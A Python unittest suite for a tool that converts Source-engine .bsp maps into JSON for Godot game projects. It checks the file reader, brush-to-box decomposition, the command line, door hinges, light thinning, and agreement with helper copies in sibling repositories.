"""dotbsp's tests. Run: python3 -I tools/bsp/tests/test_dotbsp.py

Every map here is written by tests/synth.py. Set DOTBSP_TEST_MAPS to a directory of real
.bsp files to also convert each and check the document (slow; not run by default).
"""

import copy
import importlib.util
import io
import json
import math
import os
import sys
import tempfile
import unittest
import subprocess
import zipfile
from contextlib import redirect_stderr, redirect_stdout

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
sys.path.insert(0, HERE)

import bsp as cli                                     # noqa: E402
import synth                                          # noqa: E402
from dotbsp import boxes, docboxes, gma, intermediate, lights, reader, sources  # noqa: E402


def cube_planes(x0, y0, z0, x1, y1, z1):
    return [(1, 0, 0, x1), (-1, 0, 0, -x0), (0, 1, 0, y1), (0, -1, 0, -y0), (0, 0, 1, z1), (0, 0, -1, -z0)]


def corners(x0, y0, z0, x1, y1, z1):
    return [(x, y, z) for x in (x0, x1) for y in (y0, y1) for z in (z0, z1)]


def turned(pts, deg):
    c, s = math.cos(math.radians(deg)), math.sin(math.radians(deg))
    return [(x * c - y * s, x * s + y * c, z) for x, y, z in pts]


def planes_of(pts_box, deg):
    """The six planes of a box turned `deg` about Z."""
    x0, y0, z0, x1, y1, z1 = pts_box
    c, s = math.cos(math.radians(deg)), math.sin(math.radians(deg))
    out = []
    for (nx, ny), d in (((1, 0), x1), ((-1, 0), -x0), ((0, 1), y1), ((0, -1), -y0)):
        out.append((nx * c - ny * s, nx * s + ny * c, 0.0, d))
    return out + [(0, 0, 1, z1), (0, 0, -1, -z0)]


class Reader(unittest.TestCase):
    def load(self, **kw):
        return reader.Bsp("t.bsp", data=synth.build(**kw)).load()

    def test_v20(self):
        b = self.load()
        self.assertEqual(b.version, 20)
        self.assertEqual(b.revision, 7)
        self.assertEqual(len(b.brushes), 1)
        self.assertEqual(b.model_brushes(0), {0})
        self.assertEqual(b.entities[0]["skyname"], "sky_test")

    def test_bevel_sides_are_dropped(self):
        b = self.load()
        self.assertEqual(len(b.brush_planes(0)), 6)
        hull = b.brush_hull(0)
        self.assertEqual(sorted(set(tuple(round(v) for v in p) for p in hull)), sorted(corners(0, 0, 0, 64, 64, 64)))

    def test_v19_leaf_size(self):
        b = self.load(version=19, boxes=[(0, 0, 0, 8, 8, 8), (16, 0, 0, 24, 8, 8)])
        self.assertEqual(b.model_brushes(0), {0, 1})

    def test_v21_swapped_directory(self):
        b = self.load(version=21, swapped=True)
        self.assertEqual(b.model_brushes(0), {0})
        self.assertEqual(b.entities[1]["classname"], "info_player_terrorist")

    def test_v21_plain_directory(self):
        self.assertEqual(self.load(version=21).model_brushes(0), {0})

    def test_rejects_other_files(self):
        with self.assertRaises(ValueError):
            reader.Bsp("x", data=b"IBSP" + b"\0" * 2000)
        with self.assertRaises(ValueError):
            reader.Bsp("x", data=b"VBSP")
        bad = bytearray(synth.build())
        bad[4:8] = (29).to_bytes(4, "little")
        with self.assertRaises(ValueError):
            reader.Bsp("x", data=bytes(bad))

    def test_latin1_material(self):
        b = self.load(materials=("customs/Früchte/wall",))
        self.assertEqual(b.side_material(b.brushsides[0])[0], "customs/Früchte/wall")

    def test_no_static_props_or_pak(self):
        b = self.load()
        self.assertEqual(b.static_props(), [])
        self.assertEqual(b.pak_names(), [])

    def test_helpers(self):
        self.assertEqual(reader.entity_vec({"origin": "1 2 3"}), [1.0, 2.0, 3.0])
        self.assertEqual(reader.entity_vec({}, default=(4, 5, 6)), [4, 5, 6])
        self.assertAlmostEqual(reader.entity_yaw({"angles": "0 90 0"}), 90.0)
        self.assertEqual(reader.to_godot((1, 2, 3)), (1, 3, -2))
        ents = reader.parse_entities('{\n"classname" "a"\n"k" "v"\n}\n{\n"classname" "b"\n}\n')
        self.assertEqual([e["classname"] for e in ents], ["a", "b"])


class Boxes(unittest.TestCase):
    def test_axis_box(self):
        out = boxes.decompose(cube_planes(0, 0, 0, 10, 20, 30), corners(0, 0, 0, 10, 20, 30))
        self.assertEqual(len(out), 1)
        self.assertEqual(out[0]["kind"], "box")
        self.assertEqual((out[0]["x"], out[0]["y"], out[0]["z"]), ((0, 10), (0, 20), (0, 30)))

    def test_thin_pane_is_a_box(self):
        out = boxes.decompose(cube_planes(0, 0, 0, 100, 0.25, 50), corners(0, 0, 0, 100, 0.25, 50))
        self.assertEqual([b["kind"] for b in out], ["box"])

    def test_wedge_is_not_a_box(self):
        pts = [(0, 0, 0), (64, 0, 0), (0, 256, 0), (64, 256, 0), (0, 256, 128), (64, 256, 128)]
        self.assertIsNone(boxes.box_in_frame(pts, 0.0, 0.5))

    def test_turned_box(self):
        pts = turned(corners(0, 0, 0, 100, 40, 10), 30)
        out = boxes.decompose(planes_of((0, 0, 0, 100, 40, 10), 30), pts)
        self.assertEqual(len(out), 1)
        b = out[0]
        self.assertAlmostEqual(abs(b["x"][1] - b["x"][0]) * abs(b["y"][1] - b["y"][0]), 4000, delta=5)
        self.assertAlmostEqual(b["z"][1] - b["z"][0], 10, places=3)

    def test_octagon_prism_is_one_box(self):
        r = 50
        ring = [(r * math.cos(math.radians(22.5 + 45 * k)), r * math.sin(math.radians(22.5 + 45 * k))) for k in range(8)]
        pts = [(x, y, z) for x, y in ring for z in (0, 100)]
        planes = [(math.cos(math.radians(45 * k)), math.sin(math.radians(45 * k)), 0, r * math.cos(math.radians(22.5)))
                  for k in range(8)] + [(0, 0, 1, 100), (0, 0, -1, 0)]
        out = boxes.decompose(planes, pts)
        self.assertEqual([b["kind"] for b in out], ["prism"])

    def test_prism(self):
        # a triangular column fills half its rectangle: slabs, never the rectangle
        tri = [(0, 0), (100, 0), (0, 100)]
        pts = [(x, y, z) for x, y in tri for z in (0, 50)]
        planes = [(0, -1, 0, 0), (-1, 0, 0, 0), (0.7071, 0.7071, 0, 70.71), (0, 0, 1, 50), (0, 0, -1, 0)]
        out = boxes.decompose(planes, pts)
        self.assertTrue(out)
        self.assertNotIn("prism", [b["kind"] for b in out])
        for b in out:
            self.assertGreaterEqual(b["z"][0], -0.01)
            self.assertLessEqual(b["z"][1], 50.01)

    def test_slope_slabs_follow_the_gradient(self):
        # a wedge rising along +Y: slabs cut along Y, each under the slope
        pts = [(0, 0, 0), (64, 0, 0), (0, 256, 0), (64, 256, 0), (0, 256, 128), (64, 256, 128)]
        planes = [(0, 0, -1, 0), (-1, 0, 0, 0), (1, 0, 0, 64), (0, 1, 0, 256), (0, -0.4472, 0.8944, 0)]
        out = boxes.decompose(planes, pts, slab=32)
        self.assertGreater(len(out), 4)
        for b in out:
            top_y = b["y"][1]
            self.assertLessEqual(b["z"][1], top_y * 0.5 + 0.6)

    def test_ramp_when_asked(self):
        pts = [(0, 0, 0), (64, 0, 0), (0, 256, 0), (64, 256, 0), (0, 256, 128), (64, 256, 128)]
        planes = [(0, 0, -1, 0), (-1, 0, 0, 0), (1, 0, 0, 64), (0, 1, 0, 256), (0, -0.4472, 0.8944, 0)]
        out = boxes.decompose(planes, pts, tilt=True)
        self.assertTrue(any(b["kind"] == "ramp" for b in out), [b["kind"] for b in out])


class Intermediate(unittest.TestCase):
    def doc(self, **kw):
        b = reader.Bsp("t.bsp", data=synth.build(**kw)).load()
        return intermediate.build(b, credit={"author": "someone", "page": "https://example.org/m", "licence": "x",
                                             "no_share_check": "2026-10-19, none", "credit_line": "Map by someone"})

    def test_document(self):
        d = self.doc()
        self.assertEqual(intermediate.check(d), [])
        self.assertEqual(d["format"], intermediate.FORMAT)
        self.assertEqual(d["counts"]["brushes"], 1)
        self.assertEqual(len(d["spawns"]), 2)
        self.assertEqual({s["team"] for s in d["spawns"]}, set(reader.SPAWN_CLASSES[c] for c in
                                                                ("info_player_terrorist", "info_player_counterterrorist")))
        self.assertEqual(len(d["lights"]), 1)
        self.assertEqual(d["brushes"][0]["boxes"][0]["kind"], "box")
        self.assertTrue(d["brushes"][0]["player_solid"])
        self.assertEqual(len(d["brushes"][0]["sides"]), 6)
        json.dumps(d)       # must serialise as is

    def test_credit_carried_through(self):
        c = self.doc()["credit"]
        self.assertEqual(c["author"], "someone")
        self.assertEqual(c["page"], "https://example.org/m")
        self.assertEqual(c["no_share_check"], "2026-10-19, none")
        self.assertEqual(c["credit_line"], "Map by someone")

    def test_brush_entity_moved_by_origin(self):
        d = self.doc(entity_box=(-8, -8, 0, 8, 8, 16), entity_origin=(100, 0, 0))
        door = [b for b in d["brushes"] if b["model"] == 1]
        self.assertEqual(len(door), 1)
        self.assertEqual(door[0]["mins"][0], 92)
        self.assertEqual(door[0]["maxs"][0], 108)
        box = door[0]["boxes"][0]
        self.assertEqual(box["x"], [92, 108])

    def test_check_finds_problems(self):
        d = self.doc()
        d["brushes"][0]["sides"][0]["material"] = 99
        self.assertTrue(intermediate.check(d))
        self.assertTrue(intermediate.check({"format": "other"}))


class Cli(unittest.TestCase):
    def run_cli(self, *argv):
        out, err = io.StringIO(), io.StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            rc = cli.main(["bsp.py"] + list(argv))
        return rc, out.getvalue(), err.getvalue()

    def test_convert_and_list(self):
        with tempfile.TemporaryDirectory() as t:
            p = os.path.join(t, "ze_test.bsp")
            open(p, "wb").write(synth.build())
            with zipfile.ZipFile(os.path.join(t, "surf_zipped.zip"), "w") as z:
                z.writestr("maps/surf_zipped.bsp", synth.build(version=21, swapped=True))
            out = os.path.join(t, "o", "ze_test.json")
            rc, _o, err = self.run_cli("convert", p, "--out", out, "--author", "A", "--page", "https://x")
            self.assertEqual(rc, 0, err)
            d = json.load(open(out))
            self.assertEqual(d["credit"]["author"], "A")
            self.assertEqual(d["source"]["bsp_version"], 20)
            rc, o, err = self.run_cli("--list", t, "--json")
            self.assertEqual(rc, 0)
            rows = {r["name"]: r for r in json.loads(o)["maps"]}
            self.assertEqual(set(rows), {"ze_test", "surf_zipped"})
            self.assertEqual(rows["ze_test"]["target"], "game-zombie-zone")
            self.assertEqual(rows["surf_zipped"]["version"], 21)
            self.assertEqual(rows["surf_zipped"]["entities"], 4)
            rc, o, _ = self.run_cli("list", t, "--markdown")
            self.assertIn("| surf_zipped | game-g2gfast |", o)

    def test_convert_warns_without_credit(self):
        with tempfile.TemporaryDirectory() as t:
            p = os.path.join(t, "a.bsp")
            open(p, "wb").write(synth.build())
            rc, _o, err = self.run_cli("convert", p, "--out", os.path.join(t, "a.json"))
            self.assertEqual(rc, 0)
            self.assertIn("no author or page", err)

    def test_converted_and_queue(self):
        with tempfile.TemporaryDirectory() as t:
            os.makedirs(os.path.join(t, "zombie-zone-maps", "maps"))
            json.dump({"maps": [{"id": "ze_test"}]}, open(os.path.join(t, "zombie-zone-maps", "maps.json"), "w"))
            src = os.path.join(t, "in")
            os.makedirs(src)
            for n in ("ze_test", "ze_new"):
                open(os.path.join(src, n + ".bsp"), "wb").write(synth.build())
            rc, o, _ = self.run_cli("list", src, "--json", "--converted", t, "--queue")
            self.assertEqual([r["name"] for r in json.loads(o)["maps"]], ["ze_new"])

    def test_targets(self):
        self.assertEqual(sources.target("bhop_x"), "game-g2gfast")
        self.assertEqual(sources.target("ph_x"), "mg-prop-hunt")
        self.assertIsNone(sources.target("unknown_x"))


# ---- the helpers moved out of the maps repositories' importers --------------------------------
#
# Each test loads a repository's own copy straight from its checkout (they sit beside dot-map in
# ~/godot) and compares on that repository's committed documents. A checkout that is not there
# skips its comparison; the fixtures below run everywhere.

GODOT = os.path.abspath(os.path.join(HERE, "..", "..", "..", ".."))


def repo_importer(repo):
    """The repository's tools/import_bsp.py as a module, or None when it is not checked out."""
    path = os.path.join(GODOT, repo, "tools", "import_bsp.py")
    if not os.path.isfile(path):
        return None
    tools = os.path.dirname(path)
    sys.path.insert(0, tools)
    sys.modules.pop("build_maps", None)
    try:
        spec = importlib.util.spec_from_file_location("copy_" + repo.replace("-", "_"), path)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
    finally:
        sys.path.remove(tools)
    return mod


def repo_docs(repo, limit=None):
    d = os.path.join(GODOT, repo, "maps")
    if not os.path.isdir(d):
        return []
    out = []
    for n in sorted(os.listdir(d)):
        if n.endswith(".json"):
            with open(os.path.join(d, n)) as fh:
                doc = json.load(fh)
            if isinstance(doc, dict) and "boxes" in doc:
                out.append((n, doc))
    return out[:limit]


def own_copy(mod, name):
    """True when the importer defines `name` itself, False when it is missing or comes from dotbsp."""
    f = getattr(mod, name, None)
    if f is None:
        return False
    return not str(getattr(f, "__module__", "") or "").startswith("dotbsp")


COPIES = ("hide-n-seek-maps", "mg-prop-hunt-maps", "murder-mystery-maps")


class DocBoxes(unittest.TestCase):
    def test_own_copy_tells_shared_from_local(self):
        import types
        local = types.ModuleType("copy_x")
        exec("def within(b, x, z, slack=0.0):\n    return True\n", local.__dict__)
        local.within.__module__ = "copy_x"
        shared = types.ModuleType("copy_y")
        shared.within = docboxes.within                  # imported from dotbsp
        self.assertTrue(own_copy(local, "within"))
        self.assertFalse(own_copy(shared, "within"))
        self.assertFalse(own_copy(shared, "no_such_helper"))

    def each_copy(self, *needs):
        """The repositories whose importer still has its OWN copy of every helper in `needs`.

        A repository that imports a helper from dotbsp, or no longer defines it, already uses the
        shared one: there is nothing to compare, and that is the goal, not an error. A repository that
        still defines its own copy is compared, so a copy that drifts still fails. The skip only
        fires when no repository is checked out at all."""
        found = 0
        for repo in COPIES:
            mod = repo_importer(repo)
            if mod is None:
                continue
            found += 1
            if all(own_copy(mod, n) for n in needs):
                yield repo, mod
        if not found:
            self.skipTest("no maps repository is checked out beside dot-map")

    def test_within_and_suburban_surface_match_every_copy(self):
        for repo, mod in self.each_copy("within", "suburban_surface"):
            for _n, doc in repo_docs(repo, 3):
                for b in doc["boxes"][:60]:
                    for x, z in ((b["at"][0], b["at"][2]), (b["at"][0] + 1.3, b["at"][2] - 0.7), (-3.0, 4.0)):
                        for slack in (0.0, 0.2):
                            self.assertEqual(docboxes.within(b, x, z, slack), mod.within(b, x, z, slack), repo)
                    self.assertEqual(docboxes.suburban_surface(b["at"], b["size"]), mod.suburban_surface(b["at"], b["size"]), repo)
        for w, h, d, y, z in ((10, 0.3, 4, 6, 1), (10, 0.3, 4, 0, 1), (0.2, 2.5, 5, 0, 0), (3, 9, 8, 4, -2),
                              (3, 9, 8, 4, 2), (8, 9, 3, 4, 2), (3, 5, 3, 0, 0), (1, 1, 1, 0, 0), (1, 3, 2, 0, 0)):
            for _repo, mod in self.each_copy("suburban_surface"):
                at = [0.0, y, z]
                self.assertEqual(docboxes.suburban_surface(at, [w, h, d]), mod.suburban_surface(at, [w, h, d]))

    def test_widen_doors_matches_every_copy_and_does_something(self):
        widened = 0
        for repo, mod in self.each_copy("widen_doors"):
            for name, doc in repo_docs(repo):
                a, b = copy.deepcopy(doc), copy.deepcopy(doc)
                with_doors = "doors" in mod.widen_doors.__code__.co_varnames[:mod.widen_doors.__code__.co_argcount]
                if with_doors:
                    n1 = docboxes.widen_doors(a["boxes"], doors=a.get("doors", []))
                    n2 = mod.widen_doors(b["boxes"], doors=b.get("doors", []))
                    self.assertEqual(a.get("doors"), b.get("doors"), repo + " " + name)
                else:
                    n1, n2 = docboxes.widen_doors(a["boxes"]), mod.widen_doors(b["boxes"])
                self.assertEqual((n1, a["boxes"]), (n2, b["boxes"]), repo + " " + name)
                widened += n1
        self.assertGreaterEqual(widened, 0)

    def test_widen_doors_on_a_wall_with_a_one_metre_gap(self):
        def wall(x, w):
            return {"at": [x, 1.25, 0.0], "size": [w, 2.5, 0.2], "mat": "plaster"}
        boxes_ = [wall(-2.0, 4.0), wall(3.0, 4.0)]          # ends at 0.0 and 1.0: a one metre gap
        door = {"at": [0.5, 1.0, 0.0], "size": [0.9, 2.0, 0.05]}
        self.assertEqual(docboxes.widen_doors(boxes_, 1.4, doors=[door]), 1)
        gap = (boxes_[1]["at"][0] - boxes_[1]["size"][0] / 2) - (boxes_[0]["at"][0] + boxes_[0]["size"][0] / 2)
        self.assertAlmostEqual(gap, 1.4, places=3)
        self.assertAlmostEqual(door["size"][0], 1.38, places=3)
        for repo, mod in self.each_copy("widen_doors"):
            if "doors" in mod.widen_doors.__code__.co_varnames:
                ref = [wall(-2.0, 4.0), wall(3.0, 4.0)]
                d2 = {"at": [0.5, 1.0, 0.0], "size": [0.9, 2.0, 0.05]}
                mod.widen_doors(ref, 1.4, doors=[d2])
                self.assertEqual((ref, d2), (boxes_, door), repo)

    def test_drop_door_leaves_matches_every_copy(self):
        class M:
            def __init__(self, boxes_):
                self.boxes = boxes_
        leaf = {"at": [0, 1.0, 0], "size": [0.9, 2.0, 0.05], "mat": "wood"}
        made = {"boxes": [leaf, dict(leaf, mat="concrete"), dict(leaf, size=[0.9, 2.5, 0.05])]}
        # Asserted on the made-up doc, not inside the loop: once every repo imports
        # the helper from dotbsp, each_copy yields nothing and the loop proves nothing.
        self.assertGreater(docboxes.drop_door_leaves(copy.deepcopy(made["boxes"])), 0)
        for repo, mod in self.each_copy("drop_door_leaves"):
            for doc in [doc for _n, doc in repo_docs(repo)] + [made]:
                a, b = copy.deepcopy(doc["boxes"]), M(copy.deepcopy(doc["boxes"]))
                n1, n2 = docboxes.drop_door_leaves(a), mod.drop_door_leaves(b)
                self.assertEqual((n1, a), (n2, b.boxes), repo)

    def test_prune_far_scenery_matches_every_copy(self):
        for repo, mod in self.each_copy("prune_far_scenery"):
            for name, doc in repo_docs(repo):
                starts = [tuple(s["at"]) for s in next(iter(doc["spawns"].values()))[:2]]
                far = {"at": [400.0, 1.0, 400.0], "size": [3.0, 2.0, 3.0], "mat": "concrete"}
                a = copy.deepcopy(doc["boxes"]) + [far]

                class M:
                    boxes = copy.deepcopy(a)
                out = io.StringIO()
                with redirect_stdout(out):
                    mod.prune_far_scenery(M, starts)
                msgs = []
                n = docboxes.prune_far_scenery(a, starts, log=msgs.append)
                self.assertEqual(a, M.boxes, repo + " " + name)
                self.assertGreaterEqual(n, 1)
                self.assertEqual(out.getvalue().strip(), msgs[0])
        self.assertEqual(docboxes.prune_far_scenery([{"at": [0, 0, 0], "size": [1, 1, 1]}], []), 0)

    def test_prune_pockets_matches_every_copy(self):
        for repo, mod in self.each_copy("prune_pockets"):
            spawn_key = "hiders" if "hide" in repo else ("props" if "prop" in repo else "players")
            for name, doc in repo_docs(repo)[:2]:
                a, b = copy.deepcopy(doc), copy.deepcopy(doc)
                # A prop hard against a wall of its own room is the case the pass exists for.
                n1 = docboxes.prune_pockets(a, mod.build_maps.size_of, mod.build_maps.footprint, spawn_key=spawn_key)
                n2 = mod.prune_pockets(b)
                self.assertEqual((n1, a["props"]), (n2, b["props"]), repo + " " + name)

    def test_prune_pockets_drops_a_prop_in_a_sealed_closet(self):
        def box(x, z, w, d, h=2.5):
            return {"at": [x, h / 2, z], "size": [w, h, d], "mat": "concrete"}
        floor = {"at": [0, -0.1, 0], "size": [12, 0.2, 6], "mat": "wood"}
        closet = [box(4.0, 1.6, 3.4, 0.2), box(4.0, -1.6, 3.4, 0.2), box(2.4, 0, 0.2, 3.4), box(5.6, 0, 0.2, 3.4)]
        doc = {"boxes": [floor] + closet, "props": [{"id": "cab", "at": [4.0, 0.0, 0.0], "yaw": 0.0}],
               "spawns": {"hiders": [{"at": [-3.0, 0.0, 0.0]}]}}
        size_of = lambda pid: (0.4, 1.2, 0.4)
        footprint = lambda pid, yaw: (0.4, 0.4)
        a = copy.deepcopy(doc)
        self.assertEqual(docboxes.prune_pockets(a, size_of, footprint), 1)
        self.assertEqual(a["props"], [])
        b = copy.deepcopy(doc)
        b["props"][0]["at"][0] = -1.0                            # in the open: nothing to drop
        self.assertEqual(docboxes.prune_pockets(b, size_of, footprint), 0)
        c = copy.deepcopy(doc)
        c["spawns"] = {"props": c["spawns"]["hiders"]}            # the key is a parameter
        self.assertEqual(docboxes.prune_pockets(c, size_of, footprint, spawn_key="props"), 1)

    def test_scatter_cover_matches_every_copy(self):
        class M:
            def __init__(self):
                self.placed = []

            def spots(self, y, step, top):
                return [(1.0 + (i * 7 % 5), float(i % 9) * 1.5, float(i // 9) * 1.5) for i in range(90)]

            def prop(self, kind, x, z, yaw, y):
                self.placed.append((kind, x, z, yaw, y))
        for repo, mod in self.each_copy("scatter_cover"):
            a, b = M(), M()
            n1 = docboxes.scatter_cover(a, 9, 7, mod.COVER_INDOOR, avoid=[(0.0, 0.0, 2.0)], avoid_r=0.0, clear=2.0)
            n2 = mod.scatter_cover(b, 9, 7, avoid=[(0.0, 0.0, 2.0)], avoid_r=0.0, clear=2.0)
            self.assertEqual((n1, a.placed), (n2, b.placed), repo)
            self.assertGreater(n1, 0)

    def test_terrain_cells_matches_the_copies_terrain_boxes(self):
        tris = [((0.0, 0.0, 10.0), (200.0, 0.0, 12.0), (0.0, 200.0, 30.0)), ((200.0, 0.0, 12.0), (200.0, 200.0, 33.0), (0.0, 200.0, 30.0)),
                ((400.0, 0.0, 5.0), (600.0, 0.0, 5.0), (400.0, 160.0, 5.0))]

        class B:
            def model_faces(self, i):
                return [(0, 0, 0, 0, 0, 0, 1)]

            def displacement_tris(self, f):
                return tris
        for repo, mod in self.each_copy("terrain_boxes"):
            # Their tuples are ((x0, x1), (height range), (y0, y1), mat); ours are dicts with the height under "z".
            theirs = [t[:3] for t in mod.terrain_boxes(B())]
            ours = boxes.terrain_cells(tris)
            self.assertEqual([(o["x"], o["z"], o["y"]) for o in ours], theirs, repo)
            self.assertGreater(len(ours), 1)

    def test_material_helpers_match_every_copy(self):
        class Bsp:
            brushes = [(0, 4, 0)]
            brushsides = [(0, 0, 0, 0), (0, 1, 0, 0), (0, 2, 0, 1), (0, 3, 0, 0), (0, -1, 0, 0)]
            texinfo = [[0] * 17 + [i] for i in range(4)]
            texdata = [(0, 0, 0, i) for i in range(4)]
            texnames = ["dev/dev_measure", "Maps/ph_x/Wood/floor_1_2_3", "tools/toolsnodraw", "plaster/wall"]
        for repo, mod in self.each_copy("brush_material", "classify"):
            self.assertEqual(docboxes.brush_material_names(Bsp, 0), mod.brush_material(Bsp, 0), repo)
            self.assertEqual(docboxes.classify_material("maps/ph_x/g/wood_floor_1_-2_3"), mod.classify("maps/ph_x/g/wood_floor_1_-2_3"))
            if own_copy(mod, "pick_material"):
                for names in (["WOOD/A"], ["TOOLS/X"], ["DEV/GRID", "BRICK/A", "BRICK/B"], ["DEV/GRID"], [], ["WOOD/B", "WOOD/A"]):
                    self.assertEqual(docboxes.majority_material(names, mod.TEXTURE_MAP, ("flat", None)), mod.pick_material(names), repo)

    def test_majority_tie_is_deterministic_across_hash_seeds(self):
        table = [("ALPHA", "a", None), ("ZULU", "z", None)]
        names = ["ZULU/1", "ALPHA/1", "ZULU/1", "ALPHA/1"]
        self.assertEqual(docboxes.majority_material(names, table), ("a", None))      # the tie goes to the sorted-first name
        self.assertEqual(docboxes.majority_material(list(reversed(names)), table), ("a", None))
        code = ("import sys; sys.path.insert(0, %r); from dotbsp import docboxes; "
                "print(docboxes.majority_material(%r, %r))" % (os.path.dirname(HERE), names, table))
        outs = {subprocess.run([sys.executable, "-I", "-c", code], capture_output=True, text=True,
                               env=dict(os.environ, PYTHONHASHSEED=str(seed))).stdout for seed in (0, 1, 2, 3, 4, 5)}
        self.assertEqual(outs, {"('a', None)\n"})

    def test_add_doors_matches_murder_mystery_including_skip(self):
        def wall(x, z, w, d):
            return {"at": [x, 1.25, z], "size": [w, 2.5, d], "mat": "plaster"}
        doc = {"boxes": [wall(-2.0, 0, 4.0, 0.2), wall(3.0, 0, 4.0, 0.2), {"at": [0, -0.1, 0], "size": [12, 0.2, 6], "mat": "wood"}],
               "props": [{"at": [0.4, 0.0, 0.6]}, {"at": [5.0, 0.0, 5.0]}], "doors": []}
        # Door hinge at x 0.0 (finished), the leaf opening towards +x: map units are metres / 0.01905.
        ents = [{"classname": "prop_door_rotating", "origin": "%f %f 0" % (0.0 / 0.01905, 0.0)},
                {"classname": "prop_door_rotating", "origin": "%f %f 0" % (1.0 / 0.01905, -20.0 / 0.01905)},
                {"classname": "light"}]
        class M:
            def __init__(self):
                self.calls = []

            def door(self, *a, **k):
                self.calls.append((a, k))
        mod = repo_importer("murder-mystery-maps")
        if mod is None:
            self.skipTest("murder-mystery-maps is not checked out")
        if not own_copy(mod, "add_doors"):
            return      # it imports the shared pass: nothing to compare

        class Bsp:
            entities = ents
        for skip in ([], [(0.0, 0.0)]):
            a, b = M(), M()
            da, db = copy.deepcopy(doc), copy.deepcopy(doc)
            mod.SKIP_DOORS[:] = skip
            out = io.StringIO()
            with redirect_stdout(out):
                n2 = mod.add_doors(b, db, Bsp, (0.0, 0.0, 0.0))
            msgs = []
            n1 = docboxes.add_doors(a, da, ents, (0.0, 0.0, 0.0), skip=skip, log=msgs.append)
            mod.SKIP_DOORS[:] = []
            self.assertEqual((n1, a.calls, da["props"]), (n2, b.calls, db["props"]))
            self.assertEqual("\n".join(msgs) + "\n", out.getvalue())
            self.assertEqual(n1, 0 if skip else 1, skip)


class DoorHinge(unittest.TestCase):
    """prop_door_rotating swings about its authored hinge when the model origin is elsewhere on the panel."""

    @staticmethod
    def door(origin, axis=None):
        e = {"classname": "prop_door_rotating", "origin": origin, "angles": "0 270 0"}
        if axis is not None:
            e["axis"] = axis
        return e

    def test_hinge_cases(self):
        # (name, entity, hinge, offset): the three stall doors of one map, a horizontal helper, a hinge at the origin
        cases = [("no axis", self.door("608 284 -255"), [608, 284, -255], None),
                 ("point off the origin", self.door("608 284 -255", "608 256 -255, 608 256 -255"), [608, 256, -255], (0.0, 28.0)),
                 ("vertical line through the origin", self.door("3991 4742 -1098", "3991 4742 -1044, 3991 4742 -1152"), [3991, 4742, -1098], None),
                 ("stale: 96 units away, a copied helper", self.door("608 352 -255", "608 256 -255, 608 256 -255"), [608, 352, -255], None),
                 ("horizontal axis is a hatch, not a hinge", self.door("242 137 274", "293 137 274, 242 137 274"), [242, 137, 274], None),
                 ("unreadable", self.door("1 2 3", "x y z"), [1, 2, 3], None)]
        for name, e, hinge, off in cases:
            h, o = reader.door_hinge(e)
            self.assertEqual([round(v, 3) for v in h], hinge, name)
            self.assertEqual(None if o is None else tuple(round(v, 3) for v in o), off, name)

    def test_mover_record_carries_the_hinge(self):
        from dotbsp import movers
        class B:
            models = []
            entities = [self.door("608 284 -255", "608 256 -255, 608 256 -255"), self.door("608 352 -255", "608 256 -255, 608 256 -255")]
        for e in B.entities:
            e.update(opendir="0", model="m.mdl", distance="90")
        recs = movers.movers(B, 0.01905, 0.0, owners={})
        a, b = recs
        self.assertAlmostEqual(a["origin"][2], -256 * 0.01905, 4)         # the hinge, not the model origin
        self.assertAlmostEqual(a["panel_width"], 2 * 28 * 0.01905, 4)
        self.assertAlmostEqual(a["panel_yaw"], 0.0, 3)                    # the panel lies along source +Y
        self.assertAlmostEqual(a["yaw"], a["panel_yaw"], 3)
        self.assertNotIn("panel_yaw", b)                                  # armed: the stale helper changes nothing
        self.assertAlmostEqual(b["origin"][2], -352 * 0.01905, 4)

    def test_add_doors_hangs_from_the_hinge(self):
        wall = lambda x, z, w, d: {"at": [x, 1.25, z], "size": [w, 2.5, d], "mat": "plaster"}
        doc = {"boxes": [wall(-2.0, 0, 4.0, 0.2), wall(3.0, 0, 4.0, 0.2), {"at": [0, -0.1, 0], "size": [12, 0.2, 6], "mat": "wood"}], "props": []}
        class M:
            calls = []
            def door(self, *a, **k):
                self.calls.append((a, k))
        for origin, axis, want_hinge in (("%f 0 0" % (0.5 / 0.01905), "0 0 0, 0 0 0", "start"), ("0 0 0", None, "start")):
            m = M()
            m.calls = []
            self.assertEqual(docboxes.add_doors(m, copy.deepcopy(doc), [self.door(origin, axis)], (0.0, 0.0, 0.0), log=lambda *_: None), 1, origin)
            self.assertEqual(m.calls[0][1]["hinge"], want_hinge)
            self.assertAlmostEqual(m.calls[0][0][1], 0.0, 1, "the door starts at the hinge x, not the model origin 0.5 m along")


class LightsEquivalence(unittest.TestCase):
    @staticmethod
    def original(lamps, max_lights):
        """murder-mystery-maps' import_bsp.py loop, transcribed: (kept, gap)."""
        gap = 0.0
        kept_l = lamps
        while len(kept_l) > max_lights:
            gap += 0.5
            kept_l = []
            for l in lamps:
                if all((l[0] - k[0]) ** 2 + (l[1] - k[1]) ** 2 + (l[2] - k[2]) ** 2 >= gap * gap for k in kept_l):
                    kept_l.append(l)
        return kept_l, gap

    def test_thin_by_gap_is_the_original_loop(self):
        import random
        rng = random.Random(3)
        for n, cap in ((10, 20), (60, 20), (200, 128), (300, 40)):
            pts = [(rng.uniform(0, 30), rng.uniform(0, 3), rng.uniform(0, 30), 0.5, [1, 1, 1]) for _ in range(n)]
            self.assertEqual(lights.thin_by_gap(pts, cap), self.original(pts, cap))
            dicts = [{"at": list(p[:3]), "energy": p[3]} for p in pts]
            kept, gap = lights.thin_by_gap(dicts, cap)
            self.assertEqual([d["at"] for d in kept], [list(p[:3]) for p in self.original(pts, cap)[0]])
            self.assertEqual(gap, self.original(pts, cap)[1])
        self.assertEqual(lights.thin_by_gap([], 5), ([], 0.0))

    def test_thin_by_gap_on_murder_mystery_lights(self):
        mod = repo_importer("murder-mystery-maps")
        if mod is None:
            self.skipTest("murder-mystery-maps is not checked out")
        if not own_copy(mod, "add_doors"):
            return      # it imports the shared pass: nothing to compare
        docs = repo_docs("murder-mystery-maps")
        self.assertTrue(docs)
        for name, doc in docs:
            pts = [tuple(l["at"]) + (l.get("energy", 1.0), l.get("colour")) for l in doc["lights"]]
            for cap in (3, max(1, len(pts) // 2)):
                self.assertEqual(lights.thin_by_gap(pts, cap), self.original(pts, cap), name)

    def test_strengthen_is_the_originals_energy(self):
        for en in (0.2, 0.9, 1.2):
            for gap in (0.0, 0.5, 4.0):
                self.assertEqual(lights.strengthen(en, gap), min(1.6, en * (1.0 + gap / 8.0)))


